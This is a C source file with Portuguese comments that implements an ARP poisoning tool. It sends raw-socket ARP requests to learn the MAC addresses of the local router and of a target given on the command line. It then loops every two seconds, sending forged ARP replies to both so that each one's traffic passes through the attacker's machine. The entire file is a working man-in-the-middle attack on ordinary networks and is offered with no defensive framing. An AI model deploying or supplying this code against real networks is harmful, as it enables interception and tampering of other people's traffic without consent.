#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <math.h>
#include <limits.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <pthread.h>
#include <stdint.h>
#include <inttypes.h>

#define MAC_ADDR_LEN 6
#define BUFFER_SIZE 1600
#define MAX_DATA_SIZE 1500
#define ARP_HDRLEN 28
#define IF_DEBUG 0

#define INT_TO_ADDR(_addr) \
(_addr & 0xFF), \
(_addr >> 8 & 0xFF), \
(_addr >> 16 & 0xFF), \
(_addr >> 24 & 0xFF)

typedef struct _arp_hdr arp_hdr;
struct _arp_hdr {
  uint16_t htype;
  uint16_t ptype;
  uint8_t hlen;
  uint8_t plen;
  uint16_t opcode;
  uint8_t sender_mac[6];
  uint8_t sender_ip[4];
  uint8_t target_mac[6];
  uint8_t target_ip[4];
};

char ifname[IFNAMSIZ];
char target_ip[15];
char target_mac[17];
char target_mac_router[17];

int getip(char *ifname, char *sender_ip){
	
	int fd, ip;
	struct ifreq ifr;

	fd = socket(AF_INET, SOCK_DGRAM, 0);

	/* I want to get an IPv4 IP address */
	ifr.ifr_addr.sa_family = AF_INET;

	/* I want IP address attached to "eth0" */
	strncpy(ifr.ifr_name, ifname, IFNAMSIZ-1);

	ioctl(fd, SIOCGIFADDR, &ifr);

	close(fd);

	ip = ((struct sockaddr_in *)(&ifr.ifr_addr))->sin_addr.s_addr;

	sprintf(sender_ip, "%s", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));

	return ip;
}

int getMac(char * ip, uint8_t * mac, unsigned char * mac_s){
	int fd;
	struct ifreq if_idx;
	struct ifreq if_mac;
	struct sockaddr_ll socket_address;
	int frame_len = 0;
	char buffer[BUFFER_SIZE];
	char dest_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; //broadcast
	short int ethertype = htons(0x0806);

	arp_hdr arp_aux;

	/* Cria um descritor de socket do tipo RAW */
	if ((fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1) {
		perror("socket");
		exit(1);
	}

	/* Obtem o indice da interface de rede */
	memset(&if_idx, 0, sizeof (struct ifreq));
	strncpy(if_idx.ifr_name, ifname, IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFINDEX, &if_idx) < 0) {
		perror("SIOCGIFINDEX");
		exit(1);
	}


	/* Obtem o endereco MAC da interface local */
	memset(&if_mac, 0, sizeof (struct ifreq));
	strncpy(if_mac.ifr_name, ifname, IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFHWADDR, &if_mac) < 0) {
		perror("SIOCGIFHWADDR");
		exit(1);
	}

	/* Indice da interface de rede */
	socket_address.sll_ifindex = if_idx.ifr_ifindex;

	/* Tamanho do endereco (ETH_ALEN = 6) */
	socket_address.sll_halen = ETH_ALEN;

	/* Endereco MAC de destino */
	memcpy(socket_address.sll_addr, dest_mac, MAC_ADDR_LEN);

	/* Preenche o buffer com 0s */
	memset(buffer, 0, BUFFER_SIZE);

	/* Monta o cabecalho Ethernet */

	/* Preenche o campo de endereco MAC de destino */	
	memcpy(buffer, dest_mac, MAC_ADDR_LEN);
	frame_len += MAC_ADDR_LEN;

	/* Preenche o campo de endereco MAC de origem */
	memcpy(buffer + frame_len, if_mac.ifr_hwaddr.sa_data, MAC_ADDR_LEN);
	frame_len += MAC_ADDR_LEN;

	/* Preenche o campo EtherType */
	memcpy(buffer + frame_len, &ethertype, sizeof(ethertype));
	frame_len += sizeof(ethertype);

	/* Monta o cabecalho ARP */

	/* Hardware type (16 bits): 1 for ethernet */
	arp_aux.htype = htons (1);

	/* Protocol type (16 bits): 2048 for IP */
	arp_aux.ptype = htons (ETH_P_IP);

	/* Hardware address length (8 bits): 6 bytes for MAC address */
	arp_aux.hlen = 6;

	/* Protocol address length (8 bits): 4 bytes for IPv4 address */
	arp_aux.plen = 4;

	/* OpCode: 1 for ARP request */
	arp_aux.opcode = htons (1);


	memcpy (&arp_aux.sender_mac, if_mac.ifr_hwaddr.sa_data, 6 * sizeof (uint8_t));
	/* Target hardware address (48 bits): zero, since we don't know it yet. */
	memset (&arp_aux.target_mac, 0, 6 * sizeof (uint8_t));
	
	// help vars for multiple sends
	char sender_ip[15];

	getip(ifname, sender_ip);

	//INFORMANDO O NOSSO IP
	inet_pton (AF_INET, sender_ip, &arp_aux.sender_ip);

	//ENVIANDO PACOTE PARA O DESTINTARIO	
	inet_pton (AF_INET, ip, &arp_aux.target_ip);

	memcpy (buffer + frame_len, &arp_aux, ARP_HDRLEN * sizeof (uint8_t));
	frame_len += ARP_HDRLEN;

	// Envia pacote 
	if (sendto(fd, buffer, frame_len, 0, (struct sockaddr *) &socket_address, sizeof (struct sockaddr_ll)) < 0) {
		perror("send");
		close(fd);
		exit(1);
	}

	unsigned char mac_dst[6];
	unsigned char mac_src[6];
	//unsigned char *arp;
	short int e_type;
	unsigned char ip_sd[4];
	short op_code;
	char sender_mac[17];
	int received = 0;

	while(recv(fd,(char *) &buffer, BUFFER_SIZE, 0) > 0 && received == 0){

		/* Copia o conteudo do cabecalho Ethernet */
		memcpy(mac_dst, buffer, sizeof(mac_dst));
		memcpy(mac_src, buffer+sizeof(mac_dst), sizeof(mac_src));
		memcpy(&e_type, buffer+sizeof(mac_dst)+sizeof(mac_src), sizeof(e_type));
		e_type = ntohs(e_type);
		
		memcpy(ip_sd, buffer+sizeof(mac_dst)+sizeof(mac_src)+(16*sizeof(char)), sizeof(ip_sd));
		memcpy(&op_code, buffer+sizeof(mac_dst)+sizeof(mac_src)+(8*sizeof(char)), sizeof(op_code));

		op_code = ntohs(op_code);
		
		
		if (htons(e_type) == ethertype) {

			memset(sender_mac, 0, sizeof(sender_mac));
			sprintf(sender_mac, " %02x:%02x:%02x:%02x:%02x:%02x", mac_src[0], mac_src[1], mac_src[2], mac_src[3], mac_src[4], mac_src[5]);
			
			memset(sender_ip, 0, sizeof(sender_ip));
			sprintf(sender_ip, "%d.%d.%d.%d", ip_sd[0], ip_sd[1], ip_sd[2], ip_sd[3]);
			

			if(strcmp(sender_ip,ip) == 0){

				memcpy(&mac, mac_src, sizeof(mac_src));

				int i;

				for(i=0; i < 6; i++){
					mac_s[i] = mac_src[i];
				}
			
				received = 1;
			
				break;
			}
	
		}
	}

	close(fd);

	return 0;
}


void sendLierArp(uint8_t mac, unsigned char * mac_b, char * sender_ip, char * target_ip){

	int fdx;
	struct ifreq if_idx;
	struct ifreq if_mac;
	struct sockaddr_ll socket_address;
	int frame_len = 0;
	char buffer[BUFFER_SIZE];
	short int ethertype = htons(0x0806);

	uint8_t origin_mac[6];
	uint8_t dest_mac[6];

	int i;

	arp_hdr arphdr;

	/* Cria um descritor de socket do tipo RAW */
	if ((fdx = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1) {
		perror("socket");
		exit(1);
	}

	/* Obtem o indice da interface de rede */
	memset(&if_idx, 0, sizeof (struct ifreq));
	strncpy(if_idx.ifr_name, ifname, IFNAMSIZ - 1);
	if (ioctl(fdx, SIOCGIFINDEX, &if_idx) < 0) {
		perror("SIOCGIFINDEX");
		exit(1);
	}


	/* Obtem o endereco MAC da interface local */
	memset(&if_mac, 0, sizeof (struct ifreq));
	strncpy(if_mac.ifr_name, ifname, IFNAMSIZ - 1);
	if (ioctl(fdx, SIOCGIFHWADDR, &if_mac) < 0) {
		perror("SIOCGIFHWADDR");
		exit(1);
	}

		// Set origin and destination	
	for(i=0; i < 6; i++){
		dest_mac[i] = mac_b[i];
		origin_mac[i] = if_mac.ifr_hwaddr.sa_data[i];
	}

	/*============== MONTA CABECALHO ARP =========*/
	/* Hardware type (16 bits): 1 for ethernet */
	arphdr.htype = htons (1);
	/* Protocol type (16 bits): 2048 for IP */
	arphdr.ptype = htons (ETH_P_IP);
	/* Hardware address length (8 bits): 6 bytes for MAC address */
	arphdr.hlen = 6;
	/* Protocol address length (8 bits): 4 bytes for IPv4 address */
	arphdr.plen = 4;
	/* OpCode: 2 for ARP  replay */
	arphdr.opcode = htons (2);
	//informa hardware address de origem
	memcpy (&arphdr.sender_mac, if_mac.ifr_hwaddr.sa_data, 6 * sizeof (uint8_t));
	//informa seta o mac do destinatario

	memcpy(&arphdr.target_mac, dest_mac, 6 * sizeof (uint8_t));

	printf("sendLierArp => MENTINDO IP %s \n", sender_ip);
	printf("sendLierArp => ALVO %s \n", target_ip);

	//salva o ip do roteador como se ele tivesse enviado
	inet_pton (AF_INET, sender_ip, &arphdr.sender_ip);
	//Informa o ip alvo que recebe o pacote
	inet_pton (AF_INET, target_ip, &arphdr.target_ip);


	/*=========== PREPARE SOCKADDR_LL =============*/
   /* Indice da interface de rede */
	socket_address.sll_ifindex = if_idx.ifr_ifindex;
	/* Tamanho do endereco (ETH_ALEN = 6) */
	socket_address.sll_halen = ETH_ALEN;


	/*============= PREENCHE BUFFER ==============*/
	/* Preenche o buffer com 0s */
	memset(buffer, 0, BUFFER_SIZE);
	/* Preenche o campo de endereco MAC de destino */	
	memcpy(buffer, dest_mac, MAC_ADDR_LEN);
	frame_len += MAC_ADDR_LEN;
	/* Preenche o campo de endereco MAC de origem */
	memcpy(buffer + frame_len, origin_mac, MAC_ADDR_LEN);
	frame_len += MAC_ADDR_LEN;
	/* Preenche o campo EtherType */
	memcpy(buffer + frame_len, &ethertype, sizeof(ethertype));
	frame_len += sizeof(ethertype);
	/* Preenche o buffer com os dados do arp */
	memcpy (buffer + frame_len, &arphdr, ARP_HDRLEN * sizeof (uint8_t));
	frame_len += ARP_HDRLEN;

	// Envia pacote 
	if (sendto(fdx, buffer, frame_len, 0, (struct sockaddr *) &socket_address, sizeof (struct sockaddr_ll)) < 0) {
		perror("send");
		close(fdx);
		exit(1);
	}

	close(fdx);
}


void  poisoning(){

	char my_ip[15];
	char router_ip[15];
	unsigned char router_ip_b[4];
	char my_ip_i;

	uint8_t router_mac;
	uint8_t target_mac;
	unsigned char router_mac_b[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
	unsigned char target_mac_b[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

	char router_mac_s[17];
	char target_mac_s[17];
	
	my_ip_i = getip(ifname, my_ip);
    router_ip_b[0] = my_ip_i & 0xFF;
    router_ip_b[1] = (my_ip_i >> 8) & 0xFF;
    router_ip_b[2] = (my_ip_i >> 16) & 0xFF;
	router_ip_b[3] = 1;
	memset(router_ip, 0, sizeof(router_ip));
	sprintf(router_ip, "%d.%d.%d.%d", router_ip_b[0],router_ip_b[1],router_ip_b[2],router_ip_b[3]);

	getMac(router_ip, &router_mac, router_mac_b);
	getMac(target_ip, &target_mac, target_mac_b);
	
	sprintf(router_mac_s, " %02x:%02x:%02x:%02x:%02x:%02x", router_mac_b[0], router_mac_b[1], router_mac_b[2], router_mac_b[3], router_mac_b[4], router_mac_b[5]);
	sprintf(target_mac_s, " %02x:%02x:%02x:%02x:%02x:%02x", target_mac_b[0], target_mac_b[1], target_mac_b[2], target_mac_b[3], target_mac_b[4], target_mac_b[5]);

	printf("x---------------------------------------------------x\n");
	printf("|    Entity\t|\tIP\t|\tMAC\t    |\n");
	printf("-----------------------------------------------------\n");
	printf("| router  \t| %s\t|%s |\n", router_ip, router_mac_s);
	printf("| target  \t| %s\t|%s |\n", target_ip, target_mac_s);
	printf("x---------------------------------------------------x\n");
	
	while(1){

		printf("\n- Lying to router:\n");
		// lie to router
		sendLierArp(router_mac, router_mac_b, target_ip, router_ip);
		
		printf("\n- Lying to target:\n");
		// lie to target
		sendLierArp(target_mac, target_mac_b, router_ip, target_ip);

		printf("--\n");

		sleep(2);
	
	}
	
}


int main(int argc, char *argv[])
{
    if (argc != 3) {
		printf("Usage: %s iface target_ip\n", argv[0]);
		return 1;
	}

	strcpy(ifname, argv[1]);
	strcpy(target_ip, argv[2]);

	poisoning();

	return 0;
}


